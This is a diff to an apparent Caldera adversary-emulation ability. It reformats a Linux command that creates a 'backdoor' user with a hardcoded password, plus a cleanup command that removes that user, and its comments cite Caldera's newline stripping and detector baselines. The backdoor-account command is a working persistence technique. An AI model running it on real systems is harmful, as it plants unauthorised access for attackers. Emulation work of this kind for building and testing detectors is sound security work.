@@ -14,16 +14,13 @@
   platforms:
     linux:
       sh:
+        # Caldera 4.2.0 strips literal newlines (see linux_file_burst_encrypt
+        # for the full explanation). The original multi-line if-block
+        # collapsed and bash treated `useradd ... echo ...` as one
+        # mangled command. Rewritten as a single-line if-then-fi block;
+        # bash's `;` placement is required between then/fi and statements.
+        # Idempotent: skip if backdoor already exists from a prior run.
         command: |
-          # Idempotent: skip if backdoor already exists from a prior run.
-          if ! id -u backdoor >/dev/null 2>&1; then
-              useradd -m -s /bin/bash backdoor || true
-              echo 'backdoor:phase21BackdoorPwd' | chpasswd || true
-          fi
+          if ! id -u backdoor >/dev/null 2>&1 ; then useradd -m -s /bin/bash backdoor || true ; echo 'backdoor:phase21BackdoorPwd' | chpasswd || true ; fi
         cleanup: |
-          # Strict cleanup — without this the user persists across runs
-          # and contaminates the per-host identity baseline that future
-          # detectors will rely on.
-          if id -u backdoor >/dev/null 2>&1; then
-              userdel -r backdoor 2>/dev/null || true
-          fi
+          if id -u backdoor >/dev/null 2>&1 ; then userdel -r backdoor 2>/dev/null || true ; fi
